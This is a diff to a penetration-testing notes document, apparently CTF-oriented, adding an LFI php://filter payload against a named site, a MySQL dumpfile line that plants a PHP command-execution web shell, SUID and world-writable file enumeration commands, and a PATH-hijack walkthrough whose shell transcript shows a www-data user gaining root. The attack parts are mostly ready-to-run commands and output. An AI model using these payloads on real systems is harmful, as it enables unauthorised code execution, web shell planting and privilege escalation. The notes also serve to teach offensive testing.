@@ -317,6 +317,17 @@ If a webserver is running on the machine, we can start with running
      			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
      			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
+* LFI : Reading a php file
+
+ If a website is affected by a LFI, we could use php filter to read the source code of a PHP File
+
+ :: 
+
+  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+
+ More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_
+
+
 
 FTP Services
 ^^^^^^^^^^^^^^^^^^
@@ -330,12 +341,18 @@ If ftp anonymous login is provided or you have login details, you can download t
 Remote Code Execution
 ^^^^^^^^^^^^^^^^^^^^^^
 
-* MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
+* MYSQL: If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.
 
  :: 
 
    echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
-   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"``
+   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
+
+ or 
+
+ ::
+ 
+  SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
 
 * **Reverse Shells**: Mostly taken from PentestMonkey Reverse shell cheat sheet and Reverse Shell Cheat sheet from HighOn.Coffee
 
@@ -517,6 +534,75 @@ Using “Expect” To Get A TTY
 
 Unprivileged shell to privileged shell
 ---------------------------------------
+
+Probably, at this point of time, we would have unprivileged shell of user www-data. It would be a good idea to first check privilege esclation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root persmissions. 
+
+If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have persmission to run.
+
+
+Privilege esclation from g0tm1lk blog
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+
+ ::
+
+   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+ 
+* Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+
+ ::
+
+   find / -writable -type d 2>/dev/null      # world-writeable folders
+   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+   find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+   find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+* Any "problem" files? Word-writeable, "nobody" files
+
+ ::
+
+   find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+   find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+
+ **Execution of binary from Relative location than Absolute**
+ If we figure out that a suid binary is running with relative locations ( for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home" )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
+
+ so we can create a file in temp:
+
+ ::
+
+  echo "bash -i" >> /tmp/id 
+
+  or 
+
+  cp /bin/sh /tmp/id
+
+ :: 
+
+  www-data@yummy:/tmp$ cp /bin/sh id
+  www-data@yummy:/tmp$ export PATH=/tmp:$PATH
+  www-data@yummy:/tmp$ which id
+  /tmp/id
+  www-data@yummy:/tmp$ /opt/backjob
+  whoami
+  root
+  # /usr/bin/id
+  uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+ By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malacious /tmp/scp gets found and executed as root -> A new bash opens with root privileges.
 
 Cron.d
 ^^^^^^^
@@ -921,43 +1007,6 @@ The below text is directly from the `here <https://www.defensecode.com/public/De
     [root@defensecode public]# cat shell.c
     /usr/bin/id > shell_output.txt
 
-Privilege esclation from g0tm1lk blog
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-* What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
-
- ::
-
-   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-
-   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-
-   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
- 
-* Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
-
- ::
-
-   find / -writable -type d 2>/dev/null      # world-writeable folders
-   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
-   find / -perm -o w -type d 2>/dev/null     # world-writeable folders
-
-   find / -perm -o x -type d 2>/dev/null     # world-executable folders
-
-   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
-
-* Any "problem" files? Word-writeable, "nobody" files
-
- ::
-
-   find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
-   find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
-
-
 Tips and Tricks
 ---------------
 
@@ -1250,7 +1299,7 @@ Tips and Tricks
    proxychains4 remmina
 
 
-* If you have sql-shell from sqlmap, we can use
+* If you have sql-shell from sqlmap/ phpmyadmin, we can use
 
  :: 
 	
